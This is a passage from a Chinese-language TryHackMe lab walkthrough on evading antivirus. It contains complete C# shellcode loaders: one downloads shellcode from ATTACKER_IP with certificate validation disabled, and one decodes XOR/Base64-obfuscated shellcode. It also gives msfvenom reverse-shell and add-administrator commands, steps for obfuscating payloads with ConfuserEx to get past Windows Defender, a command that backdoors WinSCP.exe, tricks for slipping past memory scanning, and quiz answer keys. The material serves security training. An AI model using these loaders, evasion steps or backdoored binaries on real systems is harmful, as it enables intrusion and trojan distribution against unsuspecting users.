  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    string url = "https://ATTACKER_IP/shellcode.bin";
    Stager(url);
  }

  public static void Stager(string url)
  {

    WebClient wc = new WebClient();
    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

    byte[] shellcode = wc.DownloadData(url);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

</details>

代码起初可能看起来令人生畏，但相对简单。 让我们逐步分析它的作用。

代码的第一部分将通过 P/Invoke 导入一些 Windows API 函数。 我们需要的函数是来自 `kernel32.dll` 的以下三个：

| WinAPI 函数                                                                                                                                   | 描述                           |
| :------------------------------------------------------------------------------------------------------------------------------------------ | :--------------------------- |
| [VirtualAlloc()](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)                 | 允许我们保留一些内存供我们的 shellcode 使用。 |
| [CreateThread()](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) | 创建一个线程作为当前进程的一部分。            |
| [WaitForSingleObject()](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)     | 用于线程同步。 它允许我们在继续之前等待线程完成。    |

负责导入这些函数的代码部分如下：

```csharp
//https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc 
[DllImport("kernel32")]
private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
[DllImport("kernel32")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
[DllImport("kernel32")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

我们代码中最重要的部分将在 `Stager()` 函数中，其中将实现阶段器逻辑。 Stager 函数将接收一个 URL，从该 URL 下载要执行的 shellcode。

`Stager()` 函数的第一部分将创建一个新的 `WebClient()` 对象，允许我们使用 Web 请求下载 shellcode。 在进行实际请求之前，我们将覆盖 `ServerCertificateValidationCallback` 方法，该方法负责在使用 HTTPS 请求时验证 SSL 证书，以便 WebClient 不会抱怨自签名或无效证书，这些证书我们将用于托管载荷的 Web 服务器。 之后，我们将调用 `DownloadData()` 方法从给定的 URL 下载 shellcode，并将其存储到 `shellcode` 变量中：

```csharp
WebClient wc = new WebClient();
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

byte[] shellcode = wc.DownloadData(url);
```

一旦我们的 shellcode 被下载并可在 `shellcode` 变量中使用，我们需要在实际运行之前将其复制到可执行内存中。 我们使用 `VirtualAlloc()` 向操作系统请求一个内存块。 请注意，我们请求分配足够的内存来分配 `shellcode.Length` 字节，并设置 `PAGE_EXECUTE_READWRITE` 标志，使分配的内存可执行、可读和可写。 一旦我们的可执行内存块被保留并分配给 codeAddr 变量，我们使用 Marshal.Copy() 将 shellcode 变量的内容复制到 codeAddr 变量中。

```csharp
UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
```

现在我们在一个可执行内存块中分配了 shellcode 的副本，我们使用 `CreateThread()` 函数在当前进程中生成一个新线程，该线程将执行我们的 shellcode。 传递给 CreateThread 的第三个参数指向 `codeAddr`，即我们的 shellcode 存储位置，这样当线程启动时，它会像运行常规函数一样运行我们的 shellcode 内容。 第五个参数设置为 0，意味着线程将立即启动。

一旦线程被创建，我们将调用 `WaitForSingleObject()` 函数来指示当前程序必须等待线程执行完成才能继续。 这可以防止我们的程序在 shellcode 线程有机会执行之前关闭：

```csharp
IntPtr threadHandle = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr parameter = IntPtr.Zero;
threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

WaitForSingleObject(threadHandle, 0xFFFFFFFF);
```

要编译代码，我们建议将其复制到 Windows 机器上，作为名为 staged-payload.cs 的文件，并使用以下命令进行编译：

```shell title="PowerShell"
PS C:\> csc staged-payload.cs
```

### 使用我们的阶段器运行反向 shell

一旦我们的 payload 编译完成，我们将需要设置一个 web 服务器来托管最终的 shellcode。 请记住，我们的阶段器将连接到此服务器以检索 shellcode，并在受害机器的内存中执行它。 让我们首先生成一个 shellcode（文件名需要与我们的阶段器中的 URL 匹配）：

```shell title="AttackBox"
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

请注意，我们正在为 shellcode 使用原始格式，因为阶段器会直接将下载的内容加载到内存中。

现在我们有了一个 shellcode，让我们设置一个简单的 HTTPS 服务器。 首先，我们需要使用以下命令创建一个自签名证书：

```shell title="AttackBox"
user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

您将被要求提供一些信息，但可以随意按回车键跳过任何请求的信息，因为我们不需要 SSL 证书有效。 一旦我们有了 SSL 证书，我们可以使用 python3 通过以下命令生成一个简单的 HTTPS 服务器：

```shell title="AttackBox"
user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

准备好所有这些后，我们现在可以执行我们的阶段器 payload。 阶段器应该连接到 HTTPS 服务器并检索 shellcode.bin 文件，将其加载到内存中并在受害机器上运行它。 请记住设置一个 nc 监听器，以在运行 msfvenom 时指定的相同端口上接收反向 shell：

```shell title="AttackBox"
user@AttackBox$ nc -lvp 7474
```

:::info 回答以下问题

<details>

<summary> 分阶段 payload 是否在单个包中提供我们 payload 的完整内容？ (是/否) </summary>

```plaintext
nay
```

</details>

<details>

<summary> Metasploit payload `windows/x64/meterpreter_reverse_https` 是分阶段 payload 吗？ (是/否) </summary>

```plaintext
nay
```

</details>

<details>

<summary> 分阶段 payload 的 stage0 是否负责下载要执行的最终 payload？ (是/否) </summary>

```plaintext
yea
```

</details>

<details>

<summary> 按照说明创建一个分阶段 payload 并将其上传到 THM 防病毒检查网站 `http://MACHINE_IP/` </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 7 编码和加密简介

### 什么是编码？

编码是根据算法或编码类型将数据从其原始状态转换为特定格式的过程。 它可以应用于许多数据类型，例如视频、HTML、URL 和二进制文件（EXE、图像等）。

编码是一个重要的概念，通常用于各种目的，包括但不限于：

- 程序编译和执行
- 数据存储和传输
- 数据处理，例如文件转换

同样，在 AV 规避技术中，编码也用于隐藏二进制文件中的 shellcode 字符串。 然而，仅靠编码不足以实现规避目的。 如今，AV 软件更加智能，可以分析二进制文件，一旦发现编码字符串，就会对其进行解码以检查文本的原始形式。

您还可以串联使用两个或多个编码算法，使 AV 更难发现隐藏内容。 下图显示我们将 "THM" 字符串转换为十六进制表示，然后使用 Base64 对其进行编码。 在这种情况下，您需要确保您的投放器现在处理此类编码以将字符串恢复到其原始状态。

![双重文本编码技术](img/image_20251134-113408.png)

### 什么是加密？

加密是信息和数据安全的基本要素之一，侧重于防止未经授权的访问和数据操纵。 加密过程涉及将明文（未加密内容）转换为称为密文的加密版本。 不知道加密中使用的算法和密钥，就无法读取或解密密文。

与编码一样，加密技术用于各种目的，例如安全存储和传输数据，以及端到端加密。 加密可以通过两种方式使用：双方之间共享密钥或使用公钥和私钥。

有关加密的更多信息，我们鼓励您查看 [加密 - Crypto 101](https://tryhackme.com/room/encryptioncrypto101) 房间。

![加密和解密概念!](img/image_20251134-113439.png)

### 为什么我们需要了解编码和加密？

AV 供应商实施其 AV 软件，使用静态或动态检测技术将大多数公共工具（如 Metasploit 等）列入阻止列表。 因此，如果不修改这些公共工具生成的 shellcode，您的投放器的检测率会很高。

编码和加密可用于 AV 规避技术，我们在其中对投放器中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏起来，避免被 AV 软件发现。 此外，这两种技术不仅可以用于隐藏 shellcode，还可以用于隐藏函数、变量等。 在本房间中，我们主要关注加密 shellcode 以规避 Windows Defender。

:::info 回答以下问题

<details>

<summary> 仅编码 shellcode 是否足以规避防病毒软件？ (是/否) </summary>

```plaintext
nay
```

</details>

<details>

<summary> 编码技术是否使用密钥来编码字符串或文件？ (是/否) </summary>

```plaintext
nay
```

</details>

<details>

<summary> 加密算法是否使用密钥来加密字符串或文件？ (是/否) </summary>

```plaintext
yea
```

</details>

:::

## 任务 8 Shellcode 编码和加密

### 使用 MSFVenom 进行编码

公共工具（如 Metasploit）提供编码和加密功能。 然而，AV 供应商了解这些工具构建其 payload 的方式，并采取措施检测它们。 如果您尝试直接使用这些功能，您的 payload 很可能在文件触及受害者的磁盘时就被检测到。

让我们用这种方法生成一个简单的 payload 来证明这一点。 首先，您可以使用以下命令列出 msfvenom 可用的所有编码器：

```shell title="Listing Encoders within the Metasploit Framework"
user@AttackBox$ msfvenom --list encoders | grep excellent
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
```

我们可以使用 `-e`（编码器）开关指示我们想要使用 `shikata_ga_nai` 编码器，然后使用 `-i`（迭代次数）开关指定我们想要对 payload 进行三次编码：

```shell title="Encoding using the Metasploit Framework (Shikata_ga_nai)"
user@AttackBox$ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai chosen with final size 422
Payload size: 422 bytes
Final size of csharp file: 2170 bytes
```

如果我们尝试将新生成的 payload 上传到我们的测试机器，AV 会在我们有机会执行它之前立即标记它：

<!-- ![Windows Defender detected our payload as malicious!](img/image_20251154-165410.png) -->

![Windows Defender 检测到我们的 payload 为恶意软件!](img/image_20251150-205017.png)

如果编码不起作用，我们总是可以尝试加密 payload。 直观上，我们预计这会具有更高的成功率，因为解密 payload 对 AV 来说应该是一项更困难的任务。 让我们现在尝试一下。

### 使用 MSFVenom 进行加密

您可以使用 msfvenom 轻松生成加密的 payload。 然而，加密算法的选择有些有限。 要列出可用的加密算法，您可以使用以下命令：

```shell title="Listing encryption modules within the Metasploit Framework"
user@AttackBox$ msfvenom --list encrypt
Framework Encryption Formats [--encrypt <value>]
================================================

    Name
    ----
    aes256
    base64
    rc4
    xor
```

让我们构建一个 XOR 加密的 payload。 对于这种类型的算法，您需要指定一个密钥。 命令将如下所示：

```shell title="Xoring Shellcode using the Metasploit Framework"
user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: xored-revshell.exe
```

再次强调，如果我们将生成的 shell 上传到 THM 防病毒检查！ 页面位于 `http://MACHINE_IP/`，它仍然会被防病毒软件标记。 原因仍然是防病毒供应商投入了大量时间来确保检测到简单的 msfvenom payload。

### 创建自定义 payload

克服这个问题的最佳方法是使用我们自己的自定义编码方案，这样防病毒软件就不知道如何分析我们的 payload。 请注意，您不必做任何太复杂的事情，只要它足够让防病毒软件分析时感到困惑即可。 对于此任务，我们将采用 msfvenom 生成的简单反向 shell，并使用 XOR 和 Base64 的组合来绕过 Defender。

让我们首先以 CSharp 格式使用 msfvenom 生成一个反向 shell：

```shell title="Generate a CSharp shellcode Format"
user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
```

### 编码器

在构建实际有效载荷之前，我们将创建一个程序，该程序将获取msfvenom生成的shellcode，并以我们喜欢的任何方式对其进行编码。 在这种情况下，我们将首先使用自定义密钥对有效载荷进行XOR运算，然后使用base64对其进行编码。 以下是编码器的完整代码（您也可以在Windows机器的`C:\Tools\CS Files\Encryptor.cs`中找到此代码）：

<details>

<summary> 完整有效载荷代码（点击阅读） </summary>

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "THMK3y123!";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //Original Shellcode here (csharp format)
            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };

            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}
```

</details>

代码非常简单明了，将生成一个编码的有效载荷，我们将将其嵌入到最终有效载荷中。 请记住将buf变量替换为您使用msfvenom生成的shellcode。

要编译和执行编码器，我们可以在Windows机器上使用以下命令：

```shell title="Compiling and running our custom CSharp encoder"
C:\> csc.exe Encrypter.cs
C:\> .\Encrypter.exe
qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=
```

### 自解码有效载荷

由于我们有一个编码的有效载荷，我们需要调整我们的代码，以便在执行之前解码shellcode。 为了匹配编码器，我们将以与编码相反的顺序解码所有内容，因此我们首先解码base64内容，然后使用与编码器中相同的密钥对结果进行XOR运算。 以下是完整有效载荷代码（您也可以在Windows机器的`C:\Tools\CS Files\EncStageless.cs`中获取）：

<details>

<summary> 完整有效载荷代码（点击阅读） </summary>

```csharp
using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
  
  private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }
  public static void Main()
  {

    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
    byte[] data = Convert.FromBase64String(dataBS64);

    string key = "THMK3y123!";
    //Convert Key into bytes
    byte[] keyBytes = Encoding.ASCII.GetBytes(key);

    byte[] encoded = xor(data, keyBytes);

    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

</details>

请注意，我们仅仅结合了几个在单独使用时被检测到的非常简单技术。 尽管如此，这次防病毒软件不会对有效载荷发出警告，因为这两种方法的组合不是它可以直接分析的东西。

让我们在Windows机器上使用以下命令编译我们的有效载荷：

```shell title="Compile Our Encrypted Payload"
C:\> csc.exe EncStageless.cs
```

在运行我们的有效载荷之前，让我们设置一个`nc`监听器。 将我们的有效载荷复制并执行到受害机器后，我们应该按预期获得一个连接：

```shell title="Set Up nc Listener"
user@AttackBox$ nc -lvp 443
Listening on [0.0.0.0] (family 0, port 443)
Connection from ip-10-10-139-83.eu-west-1.compute.internal 49817 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```

如您所见，有时简单的调整就足够了。 大多数情况下，您在线上找到的任何特定方法可能无法开箱即用，因为可能已经存在针对它们的检测签名。 然而，使用一点想象力来定制任何方法可能足以成功绕过。

:::info 回答以下问题

<details>

<summary> 尝试在THM防病毒检查的`http://MACHINE_IP/`上使用此技术（结合编码和加密）。 它是否绕过了已安装的防病毒软件？ </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务9 打包器

另一种击败基于磁盘的防病毒检测的方法是使用打包器。 **打包器**是一种软件，它接受一个程序作为输入并对其进行转换，使其结构看起来不同，但其功能完全保持不变。 打包器这样做有两个主要目标：

- 压缩程序以占用更少空间。
- 总体上保护程序免受逆向工程。

打包器通常被希望保护其软件免受逆向工程或破解的软件开发人员使用。 它们通过实现一系列转换来实现一定程度的保护，这些转换包括压缩、加密、添加调试保护等。 正如您可能已经猜到的，打包器也通常用于不费太多力气地混淆恶意软件。

市面上有相当多的打包器，包括UPX、MPRESS、Themida等。

### 打包应用程序

虽然每个打包器的操作方式不同，但让我们看一个简单打包器会做什么的基本示例。

当应用程序被打包时，它将使用**打包**函数以某种方式进行转换。 打包函数需要能够以可以被**解包**函数合理反转的方式混淆和转换应用程序的原始代码，以便保留应用程序的原始功能。 虽然有时打包器可能会添加一些代码（例如，使调试应用程序更加困难），但它通常希望能够执行时恢复您编写的原始代码。

![packers](img/image_20251107-190725.png)

应用程序的打包版本将包含您打包的应用程序代码。 由于这个新的打包代码被混淆了，应用程序需要能够从中解包原始代码。 为此，打包器将嵌入一个包含解包器的代码存根，并将可执行文件的主入口点重定向到它。

当您打包的应用程序被执行时，将发生以下情况：

![packers](img/image_20251107-190744.png)

1. 解包器首先被执行，因为它是可执行文件的入口点。
2. 解包器读取打包应用程序的代码。
3. 解包器将在内存中的某个位置写入原始解包代码，并将应用程序的执行流定向到它。

### 打包器和防病毒软件

到目前为止，我们可以看到打包器如何帮助绕过防病毒解决方案。 假设您构建了一个反向shell可执行文件，但防病毒软件将其捕获为恶意软件，因为它匹配已知签名。 在这种情况下，使用打包器将转换反向shell可执行文件，使其在磁盘上不匹配任何已知签名。 因此，您应该能够将您的有效载荷分发到任何机器的磁盘上而不会有太多问题。

然而，防病毒解决方案仍可能因以下几个原因捕获您打包的应用程序：

- 虽然您的原始代码可能被转换为无法识别的东西，但请记住打包的可执行文件包含一个带有解包器代码的存根。 如果解包器有已知签名，防病毒解决方案可能仅基于解包器存根就标记任何打包的可执行文件。
- 在某个时刻，您的应用程序将把原始代码解包到内存中，以便可以执行。 如果您试图绕过的防病毒解决方案可以进行内存扫描，您的代码在解包后可能仍然被检测到。

### 打包我们的shellcode

让我们从一个基本的C# shellcode开始。 您也可以在Windows机器的`C:\Tools\CS Files\UnEncStagelessPayload.cs`中找到此代码：

<details>

<summary> 完整有效载荷代码（点击阅读） </summary>

```csharp
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

</details>

此有效载荷获取由msfvenom生成的shellcode并在单独的线程中运行它。 为此，您需要生成一个新的shellcode并将其放入代码的`shellcode`变量中：

```shell title="Command Prompt"
C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
```

然后，您可以使用以下命令在Windows机器上编译您的有效载荷：

```shell title="Command Prompt"
C:\> csc UnEncStagelessPayload.cs
```

一旦您有一个可工作的可执行文件，您可以尝试将其上传到THM防病毒检查！ 页面（桌面上的链接）。 它应该立即被防病毒软件标记。 让我们在同一个有效载荷上使用打包器，看看会发生什么。

我们将使用[ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0)打包器来完成此任务，因为我们的有效载荷是用`.NET`编程的。 为方便起见，您可以在桌面上找到它的快捷方式。

ConfuserEx将要求您指定其工作文件夹。 请确保选择您的桌面作为基础目录，如下图所示。 设置好基础目录后，将要打包的可执行文件拖放到界面上，您应该会得到以下结果：

![Packer config part1](img/image_20251110-191013.png)

让我们转到设置选项卡并选择我们的有效负载。 选择后，点击"+"按钮将设置添加到您的有效负载中。 这应该会创建一个名为"true"的规则。 请确保同时启用压缩：

![Packer config part2](img/image_20251110-191034.png)

我们现在将编辑"true"规则并将其设置为最大预设：

![打包器配置部分3](img/image_20251111-191147.png)

最后，我们将转到"保护！"选项卡并点击"保护"：

![打包器配置部分4](img/image_20251112-191201.png)

新的有效载荷应该已准备就绪，并且希望在上传到 THM 防病毒检查器时不会触发任何警报！ （桌面上有快捷方式）。 实际上，如果您执行您的有效载荷并设置一个 `nc` 监听器，您应该能够获得一个反向 shell：

```shell title="AttackBox"
user@attackbox$ nc -lvp 7478
```

到目前为止一切顺利，但还记得我们讨论过防病毒软件进行内存扫描吗？ 如果您尝试在反向 shell 上运行命令，防病毒软件会注意到您的 shell 并终止它。 这是因为 Windows Defender 会挂钩某些 Windows API 调用，并在使用此类 API 调用时进行内存扫描。 对于任何使用 msfvenom 生成的 shell，都会调用 CreateProcess() 并被检测到。

### 那么我们现在该怎么办？

虽然击败内存扫描超出了本房间的范围，但您可以做一些简单的事情来避免检测：

- **只需稍等片刻**。 尝试再次生成反向 shell，并在发送任何命令前等待大约 5 分钟。 您会看到防病毒软件不再抱怨。 原因是扫描内存是一项昂贵的操作。 因此，防病毒软件会在您的进程启动后的一段时间内进行扫描，但最终会停止。
- **使用更小的有效载荷**。 有效载荷越小，被检测到的可能性就越小。 如果您使用 msfvenom 执行单个命令而不是反向 shell，防病毒软件将更难检测到它。 您可以尝试使用 `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` 看看会发生什么。

如果检测不是问题，您甚至可以使用一个简单的技巧。 从您的反向 shell 中再次运行 cmd.exe。 防病毒软件会检测到您的有效载荷并终止相关进程，但不会终止您刚刚生成的新 cmd.exe。

虽然每个防病毒软件的行为都不同，但大多数情况下，都会有类似的方法绕过它们，因此值得探索在测试时注意到的任何奇怪行为。

:::info 回答以下问题

<details>

<summary> 打包器是否有助于混淆恶意代码以绕过防病毒解决方案？ (是/否) </summary>

```plaintext
yea
```

</details>

<details>

<summary> 打包器是否通常在运行前在内存中解包原始代码？ (是/否) </summary>

```plaintext
yea
```

</details>

<details>

<summary> 某些打包器是否被某些防病毒解决方案检测为恶意？ (是/否) </summary>

```plaintext
yea
```

</details>

<details>

<summary> 按照说明创建打包的有效载荷并将其上传到 THM 防病毒检查器，地址为 `http://MACHINE_IP/` </summary>

```plaintext
No answer needed
```

</details>

:::

## 任务 10 绑定器

虽然不是防病毒绕过方法，但在设计要分发给最终用户的恶意有效载荷时，绑定器也很重要。 **绑定器** 是一种将两个（或更多）可执行文件合并为一个的程序。 当您希望将有效载荷隐藏在另一个已知程序中分发以欺骗用户相信他们正在执行不同的程序时，通常会使用它。

![绑定器](img/image_20251117-191753.png)

虽然每个绑定器的工作方式可能略有不同，但它们基本上会将您的 shellcode 代码添加到合法程序中，并以某种方式执行它。

例如，您可以更改 PE 头中的入口点，使您的 shellcode 在程序之前执行，然后在完成后将执行重定向回合法程序。 这样，当用户点击生成的可执行文件时，您的 shellcode 将首先静默执行，然后继续正常运行程序，而用户不会注意到。

### 使用 msfvenom 进行绑定

您可以使用 `msfvenom` 轻松将您偏好的有效载荷植入任何 .exe 文件中。 该二进制文件仍将正常工作，但会静默执行额外的有效载荷。 msfvenom 使用的方法通过为您的恶意程序创建一个额外的线程来注入它，因此与之前提到的略有不同，但达到了相同的结果。 拥有一个单独的线程甚至更好，因为如果您的 shellcode 因某种原因失败，您的程序不会被阻塞。

对于此任务，我们将对位于 `C:\Tools\WinSCP` 的 WinSCP 可执行文件进行后门处理。

要创建后门的 WinSCP.exe，我们可以在 Windows 机器上使用以下命令：

**注意**：为方便起见，Windows 机器上安装了 Metasploit，但生成有效载荷可能需要最多三分钟（产生的警告可以安全忽略）。

```shell title="AttackBox"
C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

生成的 WinSCP-evil.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效载荷。 在执行任何操作之前，请记住设置一个 `nc` 监听器以接收反向 shell。 当您执行后门的可执行文件时，它应该向您发送一个反向 shell，同时继续为用户执行 WinSCP.exe：

![img](img/image_20251119-191917.png)

### 绑定器和防病毒软件

绑定器在隐藏您的有效载荷免受防病毒解决方案检测方面作用不大。 简单地将两个可执行文件合并而不做任何更改意味着生成的可执行文件仍会触发原始有效载荷的任何签名。

绑定器的主要用途是欺骗用户相信他们正在执行合法的可执行文件而不是恶意有效载荷。

在创建真实有效载荷时，您可能希望使用编码器、加密器或打包器来隐藏您的 shellcode 免受基于签名的防病毒软件检测，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。

请随意尝试将您的绑定可执行文件上传到 THM 防病毒检查网站（桌面上有链接）而不进行任何打包，您应该会从服务器收到检测结果，因此这种方法本身在尝试从服务器获取标志时不会有太大帮助。

:::info 回答以下问题

<details>

<summary> 绑定器是否有助于绕过防病毒解决方案？ (是/否) </summary>

```plaintext
nay
```

</details>

<details>

<summary> 绑定器是否可用于使有效载荷看起来像合法的可执行文件？ (是/否) </summary>

```plaintext
yea
```

</details>

:::

## 任务 11 结论

在本房间中，我们探讨了攻击者可用于规避仅依赖基于磁盘检测的防病毒引擎的一些策略。 虽然这只是任何现代防病毒引擎可用机制之一，但我们至少应该能够将我们的有效载荷作为第一步传递到受害者的磁盘上。 绕过内存检测和其他高级检测机制留待未来的房间讨论。 您可能想查看 [运行时检测规避](https://tryhackme.com/room/runtimedetectionevasion) 以获取有关绕过可能阻止您的有效载荷触发的进一步 Windows 安全机制的更多信息。

请记住，任何加密器、编码器或打包器的成功很大程度上取决于防病毒引擎不知道它们的任何特征。 因此，在尝试绕过任何实际解决方案时，能够自定义自己的有效载荷至关重要。

:::info 回答以下问题

<details>

<summary> 点击并继续学习！ </summary>

```plaintext
No answer needed
```

</details>

:::
